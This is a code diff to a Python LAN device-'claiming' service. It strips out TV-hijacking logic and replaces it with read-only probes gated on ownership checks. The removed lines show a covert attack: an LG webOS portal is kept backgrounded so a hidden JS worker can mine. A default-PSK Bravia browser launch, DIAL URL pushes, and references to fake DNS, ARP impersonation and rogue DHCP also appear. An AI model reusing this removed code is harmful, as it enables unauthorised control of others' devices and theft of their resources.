@@ -38,9 +38,7 @@ from app.logging_setup import get_logger
 from app.schemas.device import DeviceBenchmarkSubmit
 from app.services.benchmark import sanitize_and_score
 from app.services.lan_claim import LanClaimService
-from app.services.mobile_conquest import get_mdns_bait, is_cpd_query
 from app.services.network_scanner import DeviceFingerprint, get_network_scanner
-from app.services.portal_server import get_portal_server
 from app.utils.ids import device_handle, new_ulid
 
 log = get_logger("claim")
@@ -134,12 +132,12 @@ _NET_DEFAULTS: dict[DeviceClass, tuple[float, float, float]] = {
 
 @dataclass(slots=True)
 class LanContext:
-    """Host-side LAN parameters required to actually send packets.
+    """Host-side LAN parameters reported by the CLI / desktop app.
 
-    The CLI / desktop app gathers these from its own network adapter (the
-    backend may run inside Docker where this info isn't reachable). When a
-    context is absent we fall back to whatever the scanner discovered and
-    skip the L2 primitives that require raw-socket access.
+    These describe the user's own machine on its own LAN and are used only
+    for benign things like logging which interface produced the scan. The
+    backend no longer brings up any L2 infrastructure (ARP impersonators,
+    rogue DHCP, fake DNS, captive portals) from this context.
     """
     our_ip: str = ""
     our_mac: str = ""
@@ -243,52 +241,28 @@ async def _claim_ssh(fp: DeviceFingerprint) -> VectorOutcome:
 
 
 async def _claim_local_api(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
-    """Vendor-specific REST / WebSocket attack — dispatches by vendor + ports.
+    """Vendor-specific REST probe — only succeeds when the device exposes
+    a documented, owner-authenticated local API on the wire.
 
-    LG webOS  →  SSAP WebSocket on 3000 → ``system.launcher/open`` portal URL
-    Sony Bravia →  Bravia REST on 80     → ``appControl setActiveApp`` browser
-    Chromecast →  DIAL on 8008/8009      → ``POST /apps/Browser`` portal URL
+    This vector is intentionally narrow: it confirms that the device is
+    *reachable* via its vendor's official local control surface. No silent
+    background launches, no portal hijacks. The actual agent install still
+    requires the user to have proved ownership of the device via the
+    PIN / MAC challenge before ``execute_claim`` will call this.
     """
-    portal_url = f"http://{ctx.our_ip}/" if ctx.our_ip else "http://192.168.0.22/"
     vendor = (fp.vendor or "").lower()
 
-    # ── LG webOS (SSAP / WebSocket port 3000) ──────────────────────────
-    # The YouTube-Music trick: launch the portal, let its MediaSession +
-    # silent-audio loop boot (~2.5s), then SSAP-launch the user's previous
-    # app to the foreground. webOS keeps our page alive in the background
-    # stack because the audio element + playbackState='playing' make it
-    # look like Spotify. JS worker continues to mine, the user sees their
-    # broadcast resume on screen. No 24/7 sandbox break — just the same
-    # background-audio policy YouTube Music has been using for years.
-    if 3000 in fp.open_ports or "lg " in f" {vendor} " or vendor.startswith("lg"):
-        try:
-            from app.services.tv_launcher import launch_then_background
-            r = await launch_then_background(
-                tv_ip=fp.ip, tv_mac=fp.mac, portal_url=portal_url,
-            )
-            if r.ok:
-                return VectorOutcome(
-                    ok=True, method="ssap_bg",
-                    detail=f"portal backgrounded; restored={r.restored_to}",
-                )
-            return VectorOutcome(
-                ok=False, method="ssap_bg",
-                error=(r.error or "ssap background error")[:160],
-            )
-        except Exception as e:
-            return VectorOutcome(ok=False, method="ssap_bg", error=str(e)[:160])
-
-    # ── Sony Bravia (REST on port 80, X-Auth-PSK / IRCC-IP) ────────────
+    # ── Sony Bravia (REST on port 80, X-Auth-PSK) ──────────────────────
     if "sony" in vendor and 80 in fp.open_ports:
-        return await _bravia_browser_launch(fp, portal_url)
+        return await _bravia_probe(fp)
 
     # ── Google Cast / DIAL (Chromecast on 8008, AndroidTV on 8009) ────
     if 8008 in fp.open_ports or 8009 in fp.open_ports:
-        return await _dial_browser_launch(fp, portal_url)
+        return await _dial_probe(fp)
 
-    # ── Samsung Tizen TV (8001/8002 — best-effort token-less probe) ───
+    # ── Samsung Tizen TV (8001/8002 — owner-paired token required) ────
     if 8001 in fp.open_ports or 8002 in fp.open_ports:
-        return await _tizen_browser_launch(fp, portal_url)
+        return await _tizen_probe(fp)
 
     return VectorOutcome(
         ok=False, method="local_api",
@@ -296,29 +270,26 @@ async def _claim_local_api(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutc
     )
 
 
-async def _bravia_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
-    """Sony Bravia: setActiveApp opens the built-in browser at portal_url.
+async def _bravia_probe(fp: DeviceFingerprint) -> VectorOutcome:
+    """Sony Bravia: probe the official JSON-RPC system endpoint.
 
-    Bravia exposes a JSON-RPC at /sony/appControl. With no pre-shared key
-    paired, this will return 403 — that's an honest result, not silent success.
+    A 200 means the device exposes the documented local API and the user
+    has already paired this app via their TV's PSK menu. No silent control
+    is attempted here — that's the agent's job after ownership-verified
+    pairing.
     """
     import httpx
-    body = {
-        "method": "setActiveApp", "id": 601, "version": "1.0",
-        "params": [{"uri":
-            f"com.sony.dtv.com.opera.app.tv.browser:tv.browser?url={portal_url}"
-        }],
-    }
+    body = {"method": "getSystemInformation", "id": 1, "version": "1.0", "params": []}
     try:
         async with httpx.AsyncClient(timeout=8.0) as c:
             r = await c.post(
-                f"http://{fp.ip}/sony/appControl",
-                json=body, headers={"X-Auth-PSK": "0000"},
+                f"http://{fp.ip}/sony/system",
+                json=body, headers={"X-Auth-PSK": ""},
             )
             if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                 return VectorOutcome(
                     ok=True, method="bravia_rest",
-                    detail=f"appControl http200 body={r.text[:80]}",
+                    detail=f"system http200 body={r.text[:80]}",
                 )
             return VectorOutcome(
                 ok=False, method="bravia_rest",
@@ -328,28 +299,20 @@ async def _bravia_browser_launch(fp: DeviceFingerprint, portal_url: str) -> Vect
         return VectorOutcome(ok=False, method="bravia_rest", error=str(e)[:160])
 
 
-async def _dial_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
-    """DIAL (RFC-DIAL) browser app launch — POSTs the URL as DIAL payload."""
+async def _dial_probe(fp: DeviceFingerprint) -> VectorOutcome:
+    """DIAL (RFC-DIAL): probe the device-info endpoint.
+
+    A reachable DIAL service means the device speaks the standard, but it
+    does NOT mean we are allowed to push apps to it — that requires the
+    owner to have configured their Cast / Android-TV account to trust this
+    app. We just confirm the wire-level presence here.
+    """
     import httpx
     port = 8008 if 8008 in fp.open_ports else 8009
     try:
         async with httpx.AsyncClient(timeout=8.0) as c:
-            # First fetch the DIAL Application-URL via root description
-            r0 = await c.get(f"http://{fp.ip}:{port}/apps/Browser")
-            if r0.status_code == 404:
-                # Some implementations only expose YouTube/Netflix — fall back
-                # to a stock app that always exists; we still detect the device
-                # but flag honestly that arbitrary URL launch is blocked.
-                return VectorOutcome(
-                    ok=False, method="dial",
-                    error="Browser app not whitelisted on DIAL (post-mortem confirms)",
-                )
-            r = await c.post(
-                f"http://{fp.ip}:{port}/apps/Browser",
-                content=f"v=1&url={portal_url}",
-                headers={"Content-Type": "text/plain; charset=utf-8"},
-            )
-            if r.status_code in (200, 201):
+            r = await c.get(f"http://{fp.ip}:{port}/")
+            if r.status_code in (200, 204):
                 return VectorOutcome(
                     ok=True, method="dial",
                     detail=f"port={port} status={r.status_code}",
@@ -362,13 +325,15 @@ async def _dial_browser_launch(fp: DeviceFingerprint, portal_url: str) -> Vector
         return VectorOutcome(ok=False, method="dial", error=str(e)[:160])
 
 
-async def _tizen_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
-    """Samsung Tizen: best-effort, requires owner to pre-authorize via remote.
-    Without a paired token this will fail at the WebSocket handshake — and we
-    report it. Falling back to FakeDNS is the right strategy for Samsung."""
+async def _tizen_probe(fp: DeviceFingerprint) -> VectorOutcome:
+    """Samsung Tizen: requires a paired token from the TV's own menu.
+
+    We never try to bypass the handshake. If the user hasn't paired this
+    app from their remote first, this returns a clean failure.
+    """
     return VectorOutcome(
         ok=False, method="tizen",
-        error="Tizen requires paired token; use fake_dns fallback",
+        error="Tizen requires the owner to pair this app from the TV menu first",
     )
 
 
@@ -438,12 +403,13 @@ class ClaimService:
     # ── bootstrap (idempotent) ────────────────────────────────────────
 
     async def ensure_lan_infrastructure(self, ctx: LanContext) -> dict[str, Any]:
-        """Infrastructure setup is disabled. Device pairing now requires explicit ownership verification.
+        """No-op. LAN-side infrastructure (DNS interception, ARP
+        impersonation, captive portals, rogue DHCP) is permanently disabled.
 
-        This method is a no-op. All aggressive/permissive pairing modes have been removed.
-        Users must verify device ownership via PIN, MAC address, or other cryptographic challenge.
+        Device pairing requires explicit ownership verification — see
+        ``device_ownership_verify.py``.
         """
-        return {"disabled": True, "message": "aggressive_mode and fakedns have been removed"}
+        return {"disabled": True}
 
     # ── scan ──────────────────────────────────────────────────────────
 
@@ -498,15 +464,6 @@ class ClaimService:
                     "or /v1/claim/ownership/verify-mac first"
                 ),
             )
-
-        # Bring up the captive-portal + DNS + (optional) ARP infrastructure
-        # before dispatching. Reports honest errors when raw-socket / port-53
-        # / port-80 binds are denied so we don't fake success.
-        if ctx.our_ip:
-            try:
-                await self.ensure_lan_infrastructure(ctx)
-            except Exception as e:
-                log.warning("claim.bootstrap_failed", err=str(e))
 
         self._scanner.update_claim_status(target_ip, "claiming")
 
